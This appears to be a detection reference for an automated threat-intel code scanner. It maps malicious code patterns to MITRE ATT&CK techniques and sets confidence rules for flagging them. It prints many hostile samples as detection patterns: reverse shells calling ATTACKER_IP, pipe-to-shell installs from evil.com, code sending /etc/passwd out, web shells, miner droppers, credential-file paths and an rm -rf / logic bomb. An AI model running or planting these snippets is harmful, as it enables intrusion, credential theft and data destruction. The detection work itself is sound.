# Threat Intelligence Reference — MITRE ATT&CK Code Indicators

## Purpose

This reference enables the threat-intel agent to detect malicious code patterns, malware indicators, backdoors, C2 communication, data exfiltration, and cryptominers in source code. Maps all findings to MITRE ATT&CK techniques.

---

## MITRE ATT&CK Techniques Detectable in Source Code

### T1059 — Command and Scripting Interpreter

Detection patterns for each sub-technique:

#### T1059.001 — PowerShell

```
# Encoded command execution
powershell -enc [Base64]
powershell -EncodedCommand [Base64]
[System.Convert]::FromBase64String

# Bypass flags
-ExecutionPolicy Bypass
-ep bypass
-nop -w hidden
Set-ExecutionPolicy Unrestricted

# Download cradles
(New-Object Net.WebClient).DownloadString
(New-Object Net.WebClient).DownloadFile
Invoke-WebRequest | Invoke-Expression
IEX (iwr 'http://...')
Start-BitsTransfer
Invoke-RestMethod | IEX

# Reflection / AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
[Runtime.InteropServices.Marshal]
Add-Type -TypeDefinition (inline C#)
```

#### T1059.004 — Unix Shell

```
# Dynamic execution
eval "$VARIABLE"
eval "$(curl ...)"
eval "$(wget -qO- ...)"
bash -c "$PAYLOAD"

# Backtick / subshell execution
`command`
$(command)

# Pipe-to-shell (HIGH confidence when from remote URL)
curl http://... | sh
curl http://... | bash
wget -qO- http://... | sh
wget -qO- http://... | bash

# Encoded payload execution
echo BASE64_STRING | base64 -d | sh
echo BASE64_STRING | base64 --decode | bash
printf '\x...' | sh

# Hidden file creation
echo "..." > /tmp/.hidden_file
chmod +x /tmp/.hidden_file && /tmp/.hidden_file

# Cron persistence
(crontab -l; echo "* * * * * /path/to/payload") | crontab -
echo "* * * * * ..." >> /var/spool/cron/crontabs/root
```

#### T1059.005 — Visual Basic

```
# Shell execution
WScript.Shell
CreateObject("WScript.Shell").Run
Shell.Application
CreateObject("Shell.Application").ShellExecute

# Auto-open macros (document weaponization)
Sub AutoOpen()
Sub Document_Open()
Sub Workbook_Open()
Sub Auto_Open()

# File system access
CreateObject("Scripting.FileSystemObject")
CreateObject("ADODB.Stream")

# PowerShell launch from VBA
Shell("powershell -enc ...")
WScript.Shell.Run "powershell ..."
```

#### T1059.006 — Python

```
# Dynamic code execution
exec(...)
eval(...)
compile(source, filename, mode)

# Dynamic imports
__import__(variable)
importlib.import_module(variable)
importlib.__import__

# Dangerous deserialization
pickle.loads(untrusted_data)
yaml.load(data)  # without Loader=SafeLoader
marshal.loads(...)

# Subprocess with shell=True
subprocess.call(user_input, shell=True)
subprocess.Popen(user_input, shell=True)
os.system(user_input)
os.popen(user_input)

# Code object manipulation
types.CodeType(...)
types.FunctionType(code_object, ...)
```

#### T1059.007 — JavaScript/TypeScript

```
# Dynamic code execution
eval(variable)
eval(atob(...))
new Function(variable)()
setTimeout(string_argument, ...)
setInterval(string_argument, ...)

# Node.js specific
require('child_process').exec(variable)
require('child_process').execSync(variable)
require('child_process').spawn(variable)
vm.runInNewContext(variable)
vm.runInThisContext(variable)
vm.compileFunction(variable)

# Dynamic require/import
require(variable)
import(variable)

# Prototype pollution
obj.__proto__.polluted = value
Object.assign({}, untrusted, ...)
_.merge({}, untrusted)  // lodash deep merge
```

---

### T1027 — Obfuscation

#### Base64 Encoding/Decoding of Commands or Payloads

```python
# Python
base64.b64decode(...)
base64.b64encode(...)
codecs.decode(string, 'base64')

# JavaScript
atob(suspicious_string)
Buffer.from(string, 'base64').toString()

# Shell
echo "..." | base64 -d
base64 --decode

# PowerShell
[Convert]::FromBase64String(...)
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...))
```

**Indicators**: Base64 strings longer than 100 characters, especially when decoded and then executed. Look for the pattern: decode -> execute.

#### XOR Encryption of Strings

```python
# Python
bytes([a ^ b for a, b in zip(data, key)])
''.join(chr(ord(c) ^ key) for c in data)

# JavaScript
string.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ key[i % key.length])).join('')

# C/C++
for (int i = 0; i < len; i++) buf[i] ^= key[i % keylen];
```

**Indicators**: Single-byte XOR keys (0x00-0xFF), repeated XOR patterns, XOR followed by execution.

#### Character Code Array Reconstruction

```javascript
// JavaScript
String.fromCharCode(104, 101, 108, 108, 111)
[104,101,108].map(c => String.fromCharCode(c)).join('')

// Python
''.join([chr(c) for c in [104, 101, 108, 108, 111]])
bytes([104, 101, 108, 108, 111]).decode()

// PHP
chr(104).chr(101).chr(108).chr(108).chr(111)
implode(array_map('chr', [104, 101, 108, 108, 111]))
```

#### Reversed Strings Executed After Reversal

```python
# Python
exec("dangerous_code"[::-1])

# JavaScript
eval("edoc_suoregnad".split('').reverse().join(''))

# PHP
eval(strrev("edoc_suoregnad"));
```

#### Multi-Layer Encoding

Pattern: `Base64 -> hex -> XOR -> execute`

Look for nested decode calls:
```python
exec(base64.b64decode(bytes.fromhex(xor_decrypt(payload))))
```

#### Variable Name Obfuscation in Non-Minified Code

**Indicators**:
- Single-character or meaningless variable names (`_0x4a3b`, `_$`, `__`) in non-minified code
- Variables named to look like standard library members but holding different values
- Array-based string lookup: `var _0x3c = ['eval','exec',...]; _0x3c[0](...)`

#### Split Strings Concatenated at Runtime

```javascript
// JavaScript
var cmd = 'ev' + 'al';
window[cmd](payload);

// Python
getattr(__builtins__, 'ev'+'al')(payload)
globals()['ex'+'ec'](payload)

// PHP
$f = 'sy'.'st'.'em'; $f($cmd);
```

---

### T1071 — Application Layer Protocol (C2 Communication)

#### HTTP/HTTPS to Hardcoded IPs or Suspicious Domains

```
# Hardcoded IP addresses (non-RFC1918)
fetch('http://45.33.32.156/...')
requests.get('http://185.141.27.100/...')
urllib.request.urlopen('http://103.224.182.250/...')

# Suspicious domain patterns
*.duckdns.org
*.ngrok.io / *.ngrok-free.app
*.serveo.net
*.portmap.io
*.localhost.run
*.trycloudflare.com
*.onion (Tor hidden service)
*.i2p
```

**Indicators**: Hardcoded non-private IPs, dynamic DNS domains, IP addresses in non-standard ports.

#### DNS Tunneling

```
# Long subdomain strings (data encoded in DNS labels)
ENCODED_DATA.ENCODED_DATA.evil.com
fetch('https://' + btoa(stolen_data).replace(/=/g,'') + '.evil.com/pixel.gif')

# TXT record queries for command retrieval
dns.resolveTxt('cmd.evil.com')
dig TXT cmd.evil.com
nslookup -type=TXT cmd.evil.com
```

**Indicators**: Subdomain labels > 30 characters, frequent TXT record lookups, DNS queries with non-standard data.

#### Legitimate Services as C2 Channels

```
# Discord webhooks
https://discord.com/api/webhooks/XXXXXXXXX/YYYYYY
https://discordapp.com/api/webhooks/...

# Telegram Bot API
https://api.telegram.org/botTOKEN/sendMessage
https://api.telegram.org/botTOKEN/getUpdates

# Pastebin / GitHub Gist for command retrieval
https://pastebin.com/raw/XXXXXXXX
https://api.github.com/gists/XXXXXXXX
https://gist.githubusercontent.com/.../raw/...

# Slack webhooks
https://hooks.slack.com/services/T.../B.../...

# Cloud storage for staging
https://storage.googleapis.com/bucket/payload
https://s3.amazonaws.com/bucket/payload
https://blob.core.windows.net/container/payload
```

#### Beacon-Like Connection Patterns

```javascript
// Periodic callbacks (C2 beacon)
setInterval(() => {
  fetch('http://c2server/beacon', {
    method: 'POST',
    body: JSON.stringify({ id: machineId, status: 'alive' })
  }).then(r => r.json()).then(cmd => eval(cmd.payload));
}, 30000);

// Jittered beacon (more sophisticated)
function beacon() {
  const jitter = Math.random() * 10000;
  setTimeout(() => {
    fetch(C2_URL).then(/*...*/);
    beacon();
  }, 30000 + jitter);
}
```

**Indicators**: `setInterval` or recursive `setTimeout` combined with `fetch`/`XMLHttpRequest` to external endpoints. Especially suspicious if response is passed to `eval`, `exec`, or `Function()`.

---

### T1195 — Supply Chain Compromise

#### Modified Install Scripts with Network Calls

```json
// package.json
{
  "scripts": {
    "preinstall": "curl http://evil.com/payload | sh",
    "postinstall": "node -e \"require('child_process').exec('curl ...')\"",
    "install": "wget -qO- http://evil.com/setup.sh | bash"
  }
}
```

```python
# setup.py
from setuptools import setup
import os
os.system("curl http://evil.com/payload | sh")
setup(...)
```

```ruby
# Gemfile / gemspec
Gem::Specification.new do |s|
  s.extensions = ['ext/extconf.rb']  # extconf.rb makes network calls
end
```

#### Dynamic Require/Import from URLs

```javascript
// Node.js
require('https').get('http://evil.com/module.js', (res) => {
  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => eval(data));
});

// Dynamic import
import('http://evil.com/module.mjs').then(m => m.default());
```

```python
# Python
import importlib, urllib.request
code = urllib.request.urlopen('http://evil.com/module.py').read()
exec(code)
```

#### Package Name Typosquatting Indicators

Common patterns:
- Missing/extra characters: `requets` vs `requests`, `lodassh` vs `lodash`
- Character substitution: `c0lors` vs `colors`, `requests-oauthlib` vs `requests_oauthlib`
- Scope confusion: `@evil/express` vs `express`
- Namespace squatting: `python-requests` vs `requests`
- Prefix/suffix additions: `requests-toolkit`, `express-helper-utils`

#### Version Range Manipulation

```json
// Accepting future compromised versions
"dependencies": {
  "package": ">=1.0.0",        // No upper bound
  "package": "*",              // Any version
  "package": "latest",        // Always latest
  "package": "^1.0.0 || >=2"  // Wide range
}
```

**Safe pattern**: Exact versions with lock file (`"package": "1.2.3"` + lock file with integrity hashes).

#### Build Script Modifications That Download External Code

```
// Makefile, Dockerfile, CI config
RUN curl -sSL http://evil.com/payload.sh | sh
RUN wget -qO /tmp/setup http://evil.com/bin && chmod +x /tmp/setup && /tmp/setup
```

---

### T1005 — Data from Local System

#### Credential File Access

```python
# SSH keys
open(os.path.expanduser('~/.ssh/id_rsa'))
open(os.path.expanduser('~/.ssh/id_ed25519'))
pathlib.Path.home() / '.ssh' / 'id_rsa'

# AWS credentials
open(os.path.expanduser('~/.aws/credentials'))
open(os.path.expanduser('~/.aws/config'))

# GCP credentials
open(os.environ.get('GOOGLE_APPLICATION_CREDENTIALS'))
open(os.path.expanduser('~/.config/gcloud/application_default_credentials.json'))

# Azure credentials
open(os.path.expanduser('~/.azure/accessTokens.json'))

# GPG keys
open(os.path.expanduser('~/.gnupg/secring.gpg'))

# Kubernetes
open(os.path.expanduser('~/.kube/config'))

# Docker
open(os.path.expanduser('~/.docker/config.json'))
```

#### Browser Credential Stores

```python
# Chrome (Linux)
os.path.expanduser('~/.config/google-chrome/Default/Login Data')
os.path.expanduser('~/.config/google-chrome/Default/Cookies')
os.path.expanduser('~/.config/google-chrome/Local State')

# Chrome (macOS)
'~/Library/Application Support/Google/Chrome/Default/Login Data'

# Chrome (Windows)
os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'

# Firefox
'~/.mozilla/firefox/*.default/logins.json'
'~/.mozilla/firefox/*.default/key4.db'

# Brave, Edge, Chromium — similar paths
```

#### System File Access

```
# Unix credential files
/etc/passwd
/etc/shadow
/etc/sudoers

# Windows credential stores
HKLM\SAM
HKLM\SECURITY
C:\Windows\System32\config\SAM
```

#### Environment Variable Enumeration

```python
# Python
os.environ                     # Full environment
os.environ.get('AWS_SECRET_ACCESS_KEY')
os.environ.get('DATABASE_URL')
os.environ.get('API_KEY')

# JavaScript/Node
process.env                    # Full environment
process.env.AWS_SECRET_ACCESS_KEY
process.env.DATABASE_URL

# Shell
env
printenv
set
```

**Sensitive environment variable patterns**: `*_KEY`, `*_SECRET`, `*_TOKEN`, `*_PASSWORD`, `*_CREDENTIAL`, `DATABASE_URL`, `MONGO_URI`, `REDIS_URL`, `API_KEY`, `AUTH_TOKEN`, `JWT_SECRET`, `ENCRYPTION_KEY`

---

### T1041 — Exfiltration Over C2 Channel

#### Base64-Encoding Data Before HTTP POST

```python
import base64, requests
data = open('/etc/passwd').read()
encoded = base64.b64encode(data.encode())
requests.post('http://evil.com/collect', data={'d': encoded})
```

```javascript
const data = require('fs').readFileSync('/etc/passwd', 'utf8');
fetch('http://evil.com/collect', {
  method: 'POST',
  body: btoa(data)
});
```

#### Chunked Data Transmission

```python
# Read file, split into chunks, send separately
data = open('sensitive.db', 'rb').read()
chunk_size = 4096
for i in range(0, len(data), chunk_size):
    chunk = base64.b64encode(data[i:i+chunk_size])
    requests.post(url, data={'c': chunk, 'i': i // chunk_size})
```

#### DNS Exfiltration

```python
import socket
data = base64.b64encode(open('/etc/passwd').read().encode()).decode()
# Send data in 63-char DNS label chunks
for i in range(0, len(data), 63):
    chunk = data[i:i+63]
    socket.getaddrinfo(f'{chunk}.exfil.evil.com', 80)
```

#### Steganographic Embedding

```python
from PIL import Image
# Hide data in least significant bits of image pixels
img = Image.open('photo.png')
# ... encode data into pixel LSBs ...
img.save('output.png')
requests.post(url, files={'img': open('output.png', 'rb')})
```

---

### T1496 — Resource Hijacking (Cryptomining)

#### Stratum Protocol Connections

```
stratum+tcp://pool.minexmr.com:4444
stratum+ssl://xmrpool.eu:9999
stratum+tcp://eth.2miners.com:2020
```

#### Mining Pool Domain Patterns

```
# Common mining pool domains
*pool.minexmr.com*
*xmrpool.eu*
*supportxmr.com*
*moneroocean.stream*
*hashvault.pro*
*2miners.com*
*f2pool.com*
*nanopool.org*
*ethermine.org*
*unmineable.com*
*nicehash.com*
*minergate.com*
*coinhive.com*  (defunct but still indicator)
```

#### Wallet Address Patterns

```
# Monero (XMR) — 95 characters starting with 4
4[0-9A-Za-z]{94}

# Bitcoin (BTC) — starts with 1, 3, or bc1
(1|3)[A-HJ-NP-Za-km-z1-9]{25,34}
bc1[a-zA-HJ-NP-Z0-9]{25,39}

# Ethereum (ETH) — 42 characters starting with 0x
0x[0-9a-fA-F]{40}
```

#### CPU/GPU Thread Manipulation

```python
# Maxing out CPU cores
import multiprocessing
num_cores = multiprocessing.cpu_count()
# Using all cores for "processing"

# Setting thread affinity
os.sched_setaffinity(0, set(range(os.cpu_count())))
```

```javascript
// Node.js worker threads for mining
const { Worker } = require('worker_threads');
for (let i = 0; i < os.cpus().length; i++) {
  new Worker('./worker.js');  // worker contains mining code
}
```

#### External Binary Download + Execution

```bash
# Download mining binary
curl -sSL http://evil.com/xmrig -o /tmp/.cache/systemd
chmod +x /tmp/.cache/systemd
/tmp/.cache/systemd --url stratum+tcp://pool:4444 --user WALLET

# Process name spoofing
cp /tmp/xmrig /tmp/[kworker/0:0]
exec -a "[kworker/0:0]" /tmp/xmrig ...
prctl(PR_SET_NAME, "[kthreadd]")
```

---

## Backdoor Detection Patterns

### Reverse Shells (CRITICAL — always HIGH confidence)

#### Python

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

# Alternative: pty-based
import pty
s = socket.socket()
s.connect(("ATTACKER_IP", PORT))
pty.spawn("/bin/sh")

# One-liner variant
python -c 'import socket,subprocess;s=socket.socket();s.connect(("IP",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

#### Bash/Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'

nc -e /bin/sh ATTACKER_IP PORT
ncat -e /bin/sh ATTACKER_IP PORT
nc ATTACKER_IP PORT -e /bin/bash

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f

0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
```

#### JavaScript/Node.js

```javascript
const net = require('net');
const { spawn } = require('child_process');
const client = new net.Socket();
client.connect(PORT, 'ATTACKER_IP', () => {
  const sh = spawn('/bin/sh', []);
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
```

#### PHP

```php
$sock = fsockopen("ATTACKER_IP", PORT);
$proc = proc_open("/bin/sh", [0 => $sock, 1 => $sock, 2 => $sock], $pipes);

// Alternative
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");

// Weevely-style
$k = "password"; $c = base64_decode($_POST['cmd']); eval($c);
```

#### Ruby

```ruby
require 'socket'
f = TCPSocket.open("ATTACKER_IP", PORT)
exec("/bin/sh", [:in, :out, :err] => f)

# Alternative
IO.popen("nc ATTACKER_IP PORT -e /bin/sh")
```

#### Go

```go
conn, _ := net.Dial("tcp", "ATTACKER_IP:PORT")
cmd := exec.Command("/bin/sh")
cmd.Stdin = conn
cmd.Stdout = conn
cmd.Stderr = conn
cmd.Run()
```

### Web Shells

```php
// Classic PHP web shell
<?php echo system($_GET['cmd']); ?>
<?php eval(base64_decode($_POST['code'])); ?>
<?php passthru($_REQUEST['c']); ?>

// Obfuscated web shell
<?php $f='sys'.'tem'; $f($_GET['c']); ?>
<?php $$_=$$_.$_;$$_=$$_.$$_;...  // p0wny-style obfuscation

// File upload + execute
move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/'.$_FILES['f']['name']);
include('uploads/'.$_FILES['f']['name']);
```

```python
# Python web shell (Flask/Django)
@app.route('/debug', methods=['POST'])
def debug():
    return str(eval(request.form['code']))

# WSGI-based
def application(environ, start_response):
    cmd = environ.get('QUERY_STRING')
    output = os.popen(cmd).read()
```

```javascript
// Node.js/Express web shell
app.post('/api/debug', (req, res) => {
  res.send(eval(req.body.code));
});

// Hidden in middleware
app.use((req, res, next) => {
  if (req.headers['x-debug-key'] === 'secret') {
    return res.send(eval(req.headers['x-debug-cmd']));
  }
  next();
});
```

### Logic Bombs

```python
# Date/time trigger
import datetime
if datetime.datetime.now() > datetime.datetime(2026, 1, 1):
    os.system("rm -rf /")  # Destructive payload

# Counter-based trigger
counter_file = '/tmp/.counter'
count = int(open(counter_file).read()) if os.path.exists(counter_file) else 0
count += 1
open(counter_file, 'w').write(str(count))
if count > 1000:
    execute_payload()

# Hostname/IP check (targeted attack)
import socket
if socket.gethostname() == 'production-server-01':
    execute_payload()

# Environment variable trigger
if os.environ.get('DEPLOY_ENV') == 'production':
    if os.environ.get('COMPANY') == 'TargetCorp':
        execute_payload()

# User-specific trigger
import getpass
if getpass.getuser() in ['admin', 'root', 'deploy']:
    execute_payload()
```

---

## Supply Chain Attack Indicators

### Known Compromised Package Patterns (2024-2026)

| Incident | Date | Vector | Impact | Detection Pattern |
|----------|------|--------|--------|-------------------|
| chalk/debug npm compromise | Sept 2025 | Maintainer account takeover | 2.6B downloads/week affected | postinstall script added, unexpected network calls |
| Shai Hulud worm | Nov 2025 | Self-replicating GitHub Actions | 20K+ repos infected | Modified workflow files, unexpected git push in CI |
| tj-actions/changed-files | March 2025 | CVE-2025-30066 | 23K repos using action | Modified action.yml, secret exfiltration in logs |
| Nx s1ngularity | Aug 2025 | pull_request_target abuse | npm token theft | Malicious PR triggers, env var access in workflow |
| xz utils backdoor | March 2024 | Compromised build scripts | SSH auth bypass (CVE-2024-3094) | Modified m4 macros, binary test fixtures |
| Ultralytics PyPI compromise | Dec 2024 | GitHub Actions abuse | Cryptominer in ML package | Modified publish workflow, mining binary in wheel |

### Slopsquatting Detection

Slopsquatting: Attackers register package names that LLMs commonly hallucinate.

**Indicators**:
- Package names that "sound right" but don't exist in official registries
- Packages with < 100 weekly downloads but imported as if well-known
- Names very similar to popular packages with unusual suffixes/prefixes:
  - `flask-utils` vs `flask-util` vs `flaskutils`
  - `python-dotenv` vs `dotenv` vs `py-dotenv`
- Recently created packages (< 6 months old) with no clear maintainer history
- README that looks AI-generated or copied from another project
- Single-version packages with suspiciously complete functionality

### Behavioral Red Flags in Dependencies

**postinstall scripts** — Flag if they:
- Make any network request (`curl`, `wget`, `fetch`, `http.get`)
- Download binaries or additional code
- Access environment variables (`process.env`, `os.environ`)
- Modify other packages in `node_modules` or `site-packages`
- Access paths outside their own package directory
- Execute shell commands via `child_process`, `subprocess`, `os.system`
- Write to system directories (`/usr/`, `/etc/`, `C:\Windows\`)

**Unnecessary dangerous imports** — Flag packages that import:
- `child_process` / `subprocess` when stated purpose is data formatting, math, or UI
- `fs` / `os` with write permissions when stated purpose is read-only
- `net` / `socket` / `http` when stated purpose is offline processing
- `crypto` when stated purpose doesn't involve cryptography

**Filesystem access anomalies**:
- Reading files outside the package's own directory
- Accessing user home directory (`~`, `$HOME`, `%USERPROFILE%`)
- Writing to temp directories with hidden filenames (`.` prefix)

---

## Confidence Calibration for Threat Intel

### HIGH Confidence (report as finding)

- Multiple indicators from the same ATT&CK technique appearing together
- Known malware pattern match:
  - Reverse shell (socket + subprocess + connect pattern)
  - Mining pool address (stratum protocol URL)
  - Known C2 framework signature (Cobalt Strike, Metasploit, Sliver)
- Combined indicators: obfuscated code + network communication + environment variable access
- postinstall script with network call + code execution
- Base64-decoded content passed directly to eval/exec
- File read from credential paths + HTTP POST to external endpoint

### MEDIUM Confidence (report with caveat)

- Single indicator that could be legitimate:
  - A monitoring/health-check tool making periodic HTTP calls
  - A CLI tool reading environment variables for configuration
  - Base64 usage for API authentication headers
- Obfuscation that could be legitimate:
  - License key validation using encoded strings
  - Feature flag evaluation with encoded config
  - Minified/bundled code (verify if build artifact vs source)
- Network communication to hardcoded IP:
  - Could be legitimate internal service
  - Could be development/staging endpoint
  - Check if IP belongs to known cloud providers

### LOW Confidence (note only, do not flag as finding)

- Patterns common in security tools:
  - Penetration testing frameworks (Metasploit modules, Burp extensions)
  - Security scanning tools (nmap wrappers, vulnerability scanners)
  - CTF challenge solutions and writeups
  - Security research and proof-of-concept code
- Base64 usage clearly for data formatting:
  - Image embedding in HTML/CSS
  - JWT token handling
  - Binary protocol encoding
  - Email attachment MIME encoding
- Shell commands in legitimate contexts:
  - Build scripts (Makefile, Dockerfile, CI/CD)
  - Development tooling (linters, formatters, test runners)
  - System administration scripts clearly labeled as such
  - Package manager operations

### IMPORTANT CONTEXT CONSIDERATIONS

Security tools, penetration testing frameworks, CTF challenges, and security education repositories legitimately contain these patterns. Before flagging:

1. Check the repository/project name and description
2. Check if the file is in a `test/`, `example/`, `docs/`, or `security/` directory
3. Check if there are comments indicating educational/research purpose
4. Check if the project's package.json/setup.py describes it as a security tool
5. If the project IS a security tool, only flag patterns that are unexpected for that tool's stated purpose
